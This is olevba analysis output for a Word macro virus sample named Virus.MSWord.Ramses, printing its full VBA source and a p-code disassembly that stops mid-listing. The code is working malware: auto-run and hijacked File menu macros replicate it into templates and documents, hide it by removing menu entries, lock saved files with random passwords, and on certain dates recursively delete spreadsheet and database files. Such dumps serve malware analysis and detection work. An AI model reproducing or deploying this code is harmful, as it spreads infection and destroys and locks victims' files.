olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ramses
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Ramses - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Ramses - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RAMSES 
in file: Virus.MSWord.Ramses - OLE stream: 'RAMSES'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "..."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.RAMSES.MAIN"
Dim a
Dim j
Dim i
Dim o
Dim h$
Dim k
Dim y
Dim d1 As Object
Dim w$
'
' RAMSES Virus: il Signore della Vita
' Italy 7/97 version 1.0
'
WordBasic.DisableAutoMacros
On Error Resume Next
ReDim r__$(8)
r__$(1) = "AutoOpen"
r__$(2) = "FileChiudi"
r__$(3) = "FileSalva"
r__$(4) = "FileStampa"
r__$(5) = "FileStampaPredef"
r__$(6) = "FileSalvaConNome"
r__$(7) = "FileApri"
r__$(8) = "RAMSES"
WordBasic.DisableInput 1
WordBasic.ScreenUpdating 0
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=0, _
                  AutoSave:=1, SaveInterval:="10"
a = -1
If WordBasic.[MacroFileName$]() = WordBasic.[FileName$]() Then
j = 0
For i = 1 To WordBasic.CountMacros()
If WordBasic.[MacroName$](i, 0) = "RAMSES" Then j = -1
Next
If Not (WordBasic.CountMacros() = 8 And j) Then
For i = WordBasic.CountMacros() To 1 Step -1
WordBasic.ToolsMacro Name:=WordBasic.[MacroName$](i, 0), Show:=1, Delete:=1
Next
For i = 1 To 8
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + r__$(i), r__$(i), 1
Next
For i = 0 To 1
If i Then o = 1 Else o = 6
For j = 1 To o Step 5
h$ = WordBasic.[MenuText$](i, j)
For k = WordBasic.CountMenuItems(h$, i) To 1 Step -1
If InStr(WordBasic.[MenuItemMacro$](h$, i, k), "Macro") Then
For y = i To 1
WordBasic.ToolsCustomizeMenus MenuType:=i, Position:=k, _
Name:=WordBasic.[MenuItemMacro$](h$, i, k), Menu:=h$, _
Remove:=1, Context:=0
Next
End If
If InStr(WordBasic.[MenuItemMacro$](h$, i, k), "Modelli") Then
WordBasic.ToolsCustomizeMenus MenuType:=i, Position:=k, _
Name:=WordBasic.[MenuItemMacro$](h$, i, k), Menu:=h$, _
Remove:=1, Context:=0
End If
Next
Next
Next
End If
Else
If WordBasic.CountMacros(1) <> 8 Then a = 0
For i = WordBasic.CountMacros(1) To 1 Step -1
If WordBasic.[Right$](WordBasic.[MacroDesc$](WordBasic.[MacroName$](i, 1)), 3) <> "..." Then
WordBasic.ToolsMacro Name:=WordBasic.[MacroName$](i, 1), Show:=3, Delete:=1
a = 0
End If
Next
End If
Dim d As Object: Set d = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs d
If d.Format = 1 Or d.Format = 0 Or d.Format = 6 Then
d.Format = 1
y = 0
Set d1 = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics d1
h$ = d1.FileSize
If (WordBasic.Minute(WordBasic.Now()) Mod 27 = 0) Or _
(WordBasic.Val(WordBasic.[Left$](h$, InStr(h$, " "))) > 46080) Then
w$ = ""
For i = 1 To 15
w$ = w$ + Chr(WordBasic.Int(Rnd() * 90) + 33)
Next
d.Password = w$
y = -1
Else
If Not a Then
For i = 1 To 8
WordBasic.MacroCopy r__$(i), WordBasic.[FileName$]() + ":" + r__$(i), 1
Next
y = -1
End If
End If
If y = -1 Then
WordBasic.FileSaveAs d
End If
End If
If WordBasic.Day(WordBasic.Now()) = 22 And (WordBasic.Month(WordBasic.Now()) Mod 2) = 0 Then
i = WordBasic.Int(Rnd() * 5)
Select Case i
Case 0
h$ = "*.xl*"
Case 1
h$ = "*.dbf"
Case 2
h$ = "*.wk*"
Case 3
h$ = "*.mdb"
Case 4
h$ = "*.ptt"
End Select
w$ = WordBasic.[Left$](WordBasic.[FileName$](), 3)
WordBasic.FileFind SearchPath:=w$, Name:=h$, SubDir:=1
k = WordBasic.CountFoundFiles() - 1
If k >= 0 Then
For y = 0 To k
WordBasic.Kill WordBasic.[FoundFileName$](y + 1)
Next
End If
WordBasic.MsgBox "La maledizione del Faraone ricada su di te !" + Chr(13) + _
Chr(10) + Chr(10) + "              Il Figlio della Luce", _
"RAMSES", 48
End If
WordBasic.DisableInput 0
WordBasic.ScreenUpdating 1
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: Virus.MSWord.Ramses - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "..."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
On Error GoTo -1: On Error GoTo e
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileApri 
in file: Virus.MSWord.Ramses - OLE stream: 'FileApri'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Apre un documento od un modello esistente...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileApri.MAIN"
On Error GoTo -1: On Error GoTo e
WordBasic.DisableAutoMacros
Dim d As Object: Set d = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen d
WordBasic.Dialog.FileOpen d
WordBasic.FileOpen d
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSalva 
in file: Virus.MSWord.Ramses - OLE stream: 'FileSalva'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Salva il documento od il modello attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSalva.MAIN"
On Error GoTo -1: On Error GoTo e:
WordBasic.DisableAutoMacros
WordBasic.FileSave
On Error Resume Next
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileChiudi 
in file: Virus.MSWord.Ramses - OLE stream: 'FileChiudi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Chiude tutte le finestre del documento attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileChiudi.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
Dim dl As Object: Set dl = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dl
If dl.NumChars <> "0" Then WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
WordBasic.FileClose
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileStampa 
in file: Virus.MSWord.Ramses - OLE stream: 'FileStampa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Stampa il documento attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileStampa.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
Dim b As Object: Set b = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint b
WordBasic.Dialog.FilePrint b
WordBasic.FilePrint b
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSalvaConNome 
in file: Virus.MSWord.Ramses - OLE stream: 'FileSalvaConNome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Salva una copia del documento in un file diverso...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSalvaConNome.MAIN"
Dim t
Dim j$
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e
Dim d As Object: Set d = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs d
If d.Format <> 1 Then
   WordBasic.Dialog.FileSaveAs d
   WordBasic.FileSaveAs d
   WordBasic.Call "RAMSES"
Else
   t = WordBasic.Window()
   j$ = d.Name
   WordBasic.FileNew Template:=WordBasic.[FileName$]()
   On Error GoTo -1: On Error GoTo h
   WordBasic.CurValues.FileSaveAs d
   d.Name = j$
   WordBasic.Dialog.FileSaveAs d
   d.Format = 1
   WordBasic.FileSaveAs d
   On Error GoTo -1: On Error GoTo e
   WordBasic.Call "RAMSES"
   If t >= WordBasic.Window() Then t = t + 1
   WordBasic.WindowList t
h:
   WordBasic.FileClose 2
End If
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileStampaPredef 
in file: Virus.MSWord.Ramses - OLE stream: 'FileStampaPredef'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Stampa il documento attivo usando le impostazioni correnti...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileStampaPredef.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
WordBasic.FilePrintDefault
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ramses
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 1109 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #5:
' 	Label e 
' Line #6:
' 	EndSub 
' Macros/VBA/FileChiudi - 1534 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	Dim 
' 	VarDefn dl (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSummaryInfo 0x0001 
' 	Set dl 
' Line #5:
' 	Ld dl 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #6:
' 	Ld dl 
' 	MemLd NumChars 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' 	EndIf 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' 	BoS 0x0000 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #9:
' 	Label e 
' Line #10:
' 	EndSub 
' Macros/VBA/FileSalva - 1267 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' 	BoS 0x0000 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #7:
' 	Label e 
' Line #8:
' 	EndSub 
' Macros/VBA/FileStampa - 1473 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' 	BoS 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn B (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePrint 0x0001 
' 	Set B 
' Line #7:
' 	Ld B 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePrint 0x0001 
' Line #8:
' 	Ld B 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FilePrint 0x0001 
' Line #9:
' 	Ld B 
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0001 
' Line #10:
' 	Label e 
' Line #11:
' 	EndSub 
' Macros/VBA/FileStampaPredef - 1329 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' 	BoS 0x0000 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemCall FilePrintDefault 0x0000 
' Line #7:
' 	Label e 
' Line #8:
' 	EndSub 
' Macros/VBA/FileSalvaConNome - 2378 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn t
' Line #3:
' 	Dim 
' 	VarDefn j
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #6:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' Line #8:
' 	Dim 
' 	VarDefn d (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set d 
' Line #9:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld d 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #11:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld d 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	St t 
' Line #16:
' 	Ld d 
' 	MemLd New 
' 	St j$ 
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed Template 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError h 
' Line #19:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	Ld j$ 
' 	Ld d 
' 	MemSt New 
' Line #21:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemSt Format$ 
' Line #23:
' 	Ld d 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' Line #25:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #26:
' 	Ld t 
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' 	EndIf 
' Line #27:
' 	Ld t 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' Line #28:
' 	Label h 
' Line #29:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label e 
' Line #32:
' 	EndSub 
' Macros/VBA/FileApri - 1459 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError e 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #4:
' 	Dim 
' 	VarDefn d (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set d 
' Line #5:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #6:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	Ld d 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #8:
' 	LitStr 0x0006 "RAMSES"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #9:
' 	Label e 
' Line #10:
' 	EndSub 
' Macros/VBA/RAMSES - 7007 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' 	Dim 
' 	VarDefn j
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn o
' Line #6:
' 	Dim 
' 	VarDefn h
' Line #7:
' 	Dim 
' 	VarDefn k
' Line #8:
' 	Dim 
' 	VarDefn y
' Line #9:
' 	Dim 
' 	VarDefn d1 (As Object)
' Line #10:
' 	Dim 
' 	VarDefn w
' Line #11:
' 	QuoteRem 0x0000 0x0000 ""
' Line #12:
' 	QuoteRem 0x0000 0x0024 " RAMSES Virus: il Signore della Vita"
' Line #13:
' 	QuoteRem 0x0000 0x0017 " Italy 7/97 version 1.0"
' Line #14:
' 	QuoteRem 0x0000 0x0000 ""
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	OptionBase 
' 	LitDI2 0x0008 
' 	Redim r__$ 0x0001 (As String)
' Line #18:
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	ArgsSt r__$ 0x0001 
' Line #19:
' 	LitStr 0x000A "FileChiudi"
' 	LitDI2 0x0002 
' 	ArgsSt r__$ 0x0001 
' Line #20:
' 	LitStr 0x0009 "FileSalva"
' 	LitDI2 0x0003 
' 	ArgsSt r__$ 0x0001 
' Line #21:
' 	LitStr 0x000A "FileStampa"
' 	LitDI2 0x0004 
' 	ArgsSt r__$ 0x0001 
' Line #22:
' 	LitStr 0x0010 "FileStampaPredef"
' 	LitDI2 0x0005 
' 	ArgsSt r__$ 0x0001 
' Line #23:
' 	LitStr 0x0010 "FileSalvaConNome"
' 	LitDI2 0x0006 
' 	ArgsSt r__$ 0x0001 
' Line #24:
' 	LitStr 0x0008 "FileApri"
' 	LitDI2 0x0007 
' 	ArgsSt r__$ 0x0001 
' Line #25:
' 	LitStr 0x0006 "RAMSES"
' 	LitDI2 0x0008 
' 	ArgsSt r__$ 0x0001 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #27:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #28:
' 	LineCont 0x0004 0B 00 12 00
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0000 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0002 "10"
' 	ParamNamed SaveInterval 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0004 
' Line #29:
' 	LitDI2 0x0001 
' 	UMi 
' 	St a 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0000 
' 	St j 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0000 
' 	For 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0006 "RAMSES"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St j 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0000 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld j 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #37:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld i 
' 	ArgsLd r__$ 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsLd r__$ 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	For 
' Line #43:
' 	Ld i 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St o 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St o 
' 	EndIf 
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld o 
' 	LitDI2 0x0005 
' 	ForStep 
' Line #45:
' 	Ld i 
' 	Ld j 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuText$] 0x0002 
' 	St h$ 
' Line #46:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	Ld h$ 
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd CountMenuItems 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #47:
' 	Ld h$ 
' 	Ld i 
' 	Ld k 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	LitStr 0x0005 "Macro"
' 	FnInStr 
' 	IfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	Ld i 
' 	LitDI2 0x0001 
' 	For 
' Line #49:
' 	LineCont 0x0008 0B 00 00 00 1E 00 00 00
' 	Ld i 
' 	ParamNamed MenuType 
' 	Ld k 
' 	ParamNamed Position 
' 	Ld h$ 
' 	Ld i 
' 	Ld k 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	ParamNamed New 
' 	Ld h$ 
' 	ParamNamed Menu 
' 	LitDI2 0x0001 
' 	ParamNamed Remove 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeMenus 0x0006 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld h$ 
' 	Ld i 
' 	Ld k 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	LitStr 0x0007 "Modelli"
' 	FnInStr 
' 	IfBlock 
' Line #53:
' 	LineCont 0x0008 0B 00 00 00 1E 00 00 00
' 	Ld i 
' 	ParamNamed MenuType 
' 	Ld k 
' 	ParamNamed Position 
' 	Ld h$ 
' 	Ld i 
' 	Ld k 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemMacro$] 0x0003 
' 	ParamNamed New 
' 	Ld h$ 
' 	ParamNamed Menu 
' 	LitDI2 0x0001 
' 	ParamNamed Remove 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeMenus 0x0006 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	ElseBlock 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0008 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St a 
' 	EndIf 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #62:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0003 "..."
' 	Ne 
' 	IfBlock 
' Line #63:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #64:
' 	LitDI2 0x0000 
' 	St a 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Next 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Dim 
' 	VarDefn d (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set d 
' Line #69:
' 	Ld d 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #70:
' 	Ld d 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld d 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	Ld d 
' 	MemLd Format$ 
' 	LitDI2 0x0006 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemSt Format$ 
' Line #72:
' 	LitDI2 0x0000 
' 	St y 
' Line #73:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd DocumentStatistics 0x0001 
' 	Set d1 
' Line #74:
' 	Ld d1 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall DocumentStatistics 0x0001 
' Line #75:
' 	Ld d1 
' 	MemLd FileSize 
' 	St h$ 
' Line #76:
' 	LineCont 0x0004 12 00 00 00
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Minute 0x0001 
' 	LitDI2 0x001B 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld h$ 
' 	Ld h$ 
' 	LitStr 0x0001 " "
' 	FnInStr 
' 	Ld WordBasic 
